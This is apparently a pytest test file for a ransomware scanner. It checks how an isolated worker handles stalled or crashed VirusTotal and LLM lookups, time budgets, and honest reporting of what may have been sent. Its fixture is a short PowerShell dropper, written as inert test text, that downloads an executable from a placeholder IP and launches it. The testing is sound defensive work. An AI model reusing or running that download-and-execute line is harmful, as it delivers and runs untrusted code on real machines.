"""I-6: VirusTotal and the LLM inside an isolated worker.

Before those layers run, the worker sends a provisional result naming them in
`scan_results.stopped_layers` (at `timeout`), then reports what each is about to
send ("external": hash, file, text). If a call stalls past the scan limit, the
parent stops the worker and keeps that result: the static findings and verdict
stand, the stalled layer reads timeout, and what may have left is a *possible*
transmission. Cooperatively, each call gets only the time left and none starts
with less than a second. Everything here is a stand-in (no network): stalls are
injected inside the worker by tests/worker_fakes.py; files are inert text."""

import json
import os
import time

import pytest

import RansomwareScanner as RS
from core import outbox as OB
from core.outputs import deliver
from engine import external
from engine import workers as W
from tests.test_incomplete_scan_alert import receiver  # noqa: F401  (fixture)
from tests.test_scanner_integration import _config

DROPPER = (b"$u = 'http://203.0.113.9/a.exe'\r\nInvoke-WebRequest $u -OutFile a.exe\r\n"
           b"Start-Process a.exe\r\n")


def _script(tmp_path, name="drop.ps1"):
    (tmp_path / "scan").mkdir(exist_ok=True)
    p = tmp_path / "scan" / name
    p.write_bytes(DROPPER)
    return p


def _cfg(tmp_path, limit, **extra):
    return _config(tmp_path, _scanner_factory="tests.worker_fakes:make_sandbox_probe",
                   scan_timeout_seconds=limit, qr_scan_enabled=False,
                   virustotal_requests_per_minute=0, **extra)


def _scan(cfg, paths, limit):
    s = RS.RansomwareScanner(cfg)
    got = []
    W.scan_isolated(s, [str(p) for p in paths], 1, limit, 0,
                    lambda i, path, r: got.append((path, r)))
    return got


def _static(tmp_path, path):
    s = RS.RansomwareScanner(_config(tmp_path, isolate_scans=False, qr_scan_enabled=False))
    try:
        return s.scan_file(str(path))
    finally:
        if s.cache is not None:
            s.cache.close()


# ======================================== the worker's limit (the hard bound)
@pytest.mark.parametrize("flag,layer,key,sent,destination", [
    ("_hang_vt", "virustotal", "virustotal", ["sha256"], None),
    ("_hang_llm", "llm", "chatgpt_analysis", ["text"], "cloud"),
], ids=["virustotal", "llm"])
def test_a_stalled_service_keeps_the_static_verdict(tmp_path, receiver, flag, layer, key, sent,
                                                    destination):
    p = _script(tmp_path)
    static = _static(tmp_path, p)
    extra = {flag: True}
    if layer == "virustotal":
        extra["virustotal_api_key"] = "k" * 64
    cfg = _cfg(tmp_path, 4, **extra)
    started = time.monotonic()
    got = _scan(cfg, [p], 4)
    assert time.monotonic() - started < 4 + 6
    assert len(got) == 1                                   # one final result
    r = got[0][1]
    assert r["scan_status"] == "partial" and "scan_failed" not in r["scan_results"]
    assert (r["verdict"], r["risk_score"]) == (static["verdict"], static["risk_score"])
    assert r["scan_results"]["stopped_layers"] == [layer]
    entry = r["scan_results"][key]
    assert entry["status"] == "timeout" and "worker was stopped" in entry["detail"]
    assert entry["transmission"] == "possible" and entry["sent"] == sent
    assert "not confirmed" in entry["detail"]
    item = {"service": layer, "sent": sent, **({"destination": destination} if destination else {})}
    assert item in r["provenance"]["shared"]
    assert any(g["layer"] == layer and "worker was stopped" in g["reason"]
               for g in r["incomplete_reasons"])
    assert OB.failed_alert(r) is None
    deliver([r], dict(cfg, webhook_url="https://siem.example.invalid/hook",
                      outbox_dir=str(tmp_path / "outbox"), jsonl_path=""))
    assert [m["kind"] for m in receiver] == ["verdict"]     # once, no failure notice


def test_each_stopped_worker_is_replaced_and_results_are_not_duplicated(tmp_path):
    files = [_script(tmp_path, f"d{i}.ps1") for i in range(2)]
    got = _scan(_cfg(tmp_path, 4, _hang_llm=True), files, 4)
    assert [os.path.basename(p) for p, _ in got] == ["d0.ps1", "d1.ps1"]
    assert all(r["scan_results"]["chatgpt_analysis"]["status"] == "timeout" for _, r in got)
    assert not any(os.path.exists(str(f) + ".probe") for f in files)   # both were stopped


def test_a_crash_during_the_virustotal_call_is_still_a_failure(tmp_path):
    p = _script(tmp_path)
    got = _scan(_cfg(tmp_path, 4, _crash_in_vt=True, virustotal_api_key="k" * 64), [p], 4)
    r = got[0][1]
    assert r["scan_status"] == "failed" and "died" in r["scan_results"]["scan_failed"]["reason"]


# ============================================ the cooperative bound (worker lives)
def test_an_llm_that_honours_its_timeout_ends_inside_the_limit(tmp_path):
    p = _script(tmp_path)
    got = _scan(_cfg(tmp_path, 5, _slow_llm=True), [p], 5)
    r = got[0][1]
    llm = r["scan_results"]["chatgpt_analysis"]
    assert "worker was stopped" not in str(llm.get("detail", ""))
    assert r["scan_status"] == "partial" and "scan_failed" not in r["scan_results"]
    with open(str(p) + ".probe") as fh:                    # the worker finished the file
        assert json.loads(fh.readline())["pid"] > 0


class _Backend:
    name, model, is_local, available = "stand-in", "m", True, True

    def __init__(self):
        self.timeouts = []

    def analyze(self, combined_content, timeout=None):
        self.timeouts.append(timeout)
        return {"is_malicious": False, "confidence": 0, "suspicious_elements": [],
                "details": "ok", "analyzed": True}


@pytest.fixture
def scanner(tmp_path):
    s = RS.RansomwareScanner(_config(tmp_path, isolate_scans=False, qr_scan_enabled=False))
    s.llm_backend = _Backend()
    s.cache = None
    yield s


def _deadline(s, left, limit):
    s.config["scan_timeout_seconds"] = limit
    s.scan_deadline = time.monotonic() + left


def test_the_llm_gets_the_time_left(scanner, tmp_path):
    _deadline(scanner, 30, 20)                             # 30 - 2 s margin
    notes = []
    scanner.external_listener = lambda *a: notes.append(a)
    r = scanner.analyze_with_llm(str(_script(tmp_path)), "some text", "")
    assert 27 < scanner.llm_backend.timeouts[0] <= 28
    assert notes == [("llm", ["text"], "local")] and r["sent"] == ["text"]


def test_no_llm_call_without_time(scanner, tmp_path):
    _deadline(scanner, 2.5, 20)                            # 0.5 s usable < 1 s
    r = scanner.analyze_with_llm(str(_script(tmp_path)), "some text", "")
    assert scanner.llm_backend.timeouts == [] and "sent" not in r
    assert r["status"] == "timeout" and "no time left" in r["details"]


def test_outside_a_worker_the_llm_call_is_unchanged(scanner, tmp_path):
    calls = []

    class OneArgument:                                     # a backend without `timeout`
        name, model, is_local, available = "x", "m", True, True

        def analyze(self, combined_content):
            calls.append(1)
            return {"is_malicious": False, "confidence": 0, "suspicious_elements": [],
                    "details": "ok", "analyzed": True}
    scanner.llm_backend = OneArgument()
    scanner.analyze_with_llm(str(_script(tmp_path)), "some text", "")
    assert calls == [1]


def test_the_virustotal_lookup_gets_the_time_left(scanner, tmp_path, monkeypatch):
    class VT:
        timeouts = []

        def get(self, url, headers=None, timeout=None):
            VT.timeouts.append(timeout)

            class R:
                status_code, text = 404, ""
            return R()
    scanner.config.update(virustotal_api_key="k" * 64, virustotal_upload_unknown=False)
    scanner.http = VT()
    _deadline(scanner, 10, 20)                              # 10 - 2 s margin = 8 s
    r = scanner.scan_file_with_virustotal(str(_script(tmp_path)))
    assert 7 < VT.timeouts[0] <= 8 and r["sent"] == ["sha256"]
    VT.timeouts.clear()
    _deadline(scanner, 2.5, 20)                             # 0.5 s usable
    r = scanner.scan_file_with_virustotal(str(_script(tmp_path)))
    assert VT.timeouts == [] and "sent" not in r and r["status"] == "timeout"


def test_no_stage_result_outside_a_worker_or_without_a_service(tmp_path):
    # One heavy layer at a time: run concurrently, whether the stage result is
    # sent depends on whether ML finishes before the stand-in LLM (thread timing).
    s = RS.RansomwareScanner(_config(tmp_path, isolate_scans=False, qr_scan_enabled=False,
                                     parallel_heavy_layers=False))
    sent = []
    s.provisional_listener = lambda result, settled=False: sent.append(result)
    s.scan_file(str(_script(tmp_path)))                     # no deadline: nothing sent
    s.config["scan_timeout_seconds"] = 300
    s.scan_deadline = time.monotonic() + 200
    s.scan_file(str(_script(tmp_path, "b.ps1")))            # no VirusTotal, no LLM
    assert sent == []
    s.llm_backend = _Backend()
    s.scan_file(str(_script(tmp_path, "c.ps1")))
    assert len(sent) == 1 and sent[0]["scan_results"]["stopped_layers"] == ["llm"]
    if s.cache is not None:
        s.cache.close()


# =========================================================== messages and merge
def _stage():
    return {"file_path": "/x/a.ps1", "verdict": "High", "risk_score": 70,
            "scan_status": "partial",
            "scan_results": {"stopped_layers": ["llm", "virustotal"],
                             "virustotal": {"status": "timeout", "detail": "stopped"},
                             "chatgpt_analysis": {"status": "timeout", "detail": "stopped"}},
            "incomplete_reasons": [{"member_path": "/x/a.ps1", "layer": "virustotal",
                                    "reason": "virustotal timeout: stopped", "status": "partial"},
                                   {"member_path": "/x/a.ps1", "layer": "llm",
                                    "reason": "llm timeout: stopped", "status": "partial"}],
            "provenance": {"shared": []}}


def test_stage_results_and_external_reports_are_checked():
    assert W.check_reply(["provisional", _stage()])[0] == "provisional"
    for change in ({"stopped_layers": ["llm", "llm"]}, {"stopped_layers": ["ml"]},
                   {"stopped_layers": []}, {"virustotal": {"status": "reported"}}):
        bad = _stage()
        bad["scan_results"].update(change)
        with pytest.raises(W.InvalidReply):
            W.check_reply(["provisional", bad])
    assert W.check_reply(["external", {"service": "llm", "sent": ["text"],
                                       "destination": "cloud"}])
    for payload in ({"service": "sandbox", "sent": ["file"], "destination": None},
                    {"service": "llm", "sent": [], "destination": None},
                    {"service": "llm", "sent": ["password"], "destination": None},
                    {"service": "llm", "sent": ["text"], "destination": "moon"},
                    {"service": "llm", "sent": ["text"]}, None):
        with pytest.raises(W.InvalidReply):
            W.check_reply(["external", payload])


def test_the_stopped_result_is_truthful_about_what_may_have_left():
    stage = _stage()
    r = W.stopped_result(stage, None, {"virustotal": {"sent": ["sha256"], "destination": None}},
                         4, 4.1)
    vt, llm = r["scan_results"]["virustotal"], r["scan_results"]["chatgpt_analysis"]
    assert vt["transmission"] == "possible" and vt["sent"] == ["sha256"]
    assert llm["transmission"] == "none" and "nothing was sent" in llm["detail"] and "sent" not in llm
    assert r["provenance"]["shared"] == [{"service": "virustotal", "sent": ["sha256"]}]
    assert {g["layer"]: g["reason"].startswith(f"{g['layer']} timeout: ")
            for g in r["incomplete_reasons"]} == {"virustotal": True, "llm": True}
    assert stage["scan_results"]["virustotal"] == {"status": "timeout", "detail": "stopped"}


def test_an_unhashed_limiter_wait_does_not_leave_the_worker_without_time(scanner, tmp_path,
                                                                         monkeypatch):
    """The quota pause counts: with 8 s usable and a 9 s pause due, no lookup."""
    class VT:
        calls = 0

        def get(self, *a, **k):
            VT.calls += 1
    scanner.config.update(virustotal_api_key="k" * 64)
    scanner.http = VT()
    monkeypatch.setattr(scanner.vt_limiter, "delay", lambda: 9.0)
    _deadline(scanner, 10, 20)
    r = scanner.scan_file_with_virustotal(str(_script(tmp_path)))
    assert VT.calls == 0 and r["status"] == "timeout"
    assert external.MIN_CALL_SECONDS == 1.0
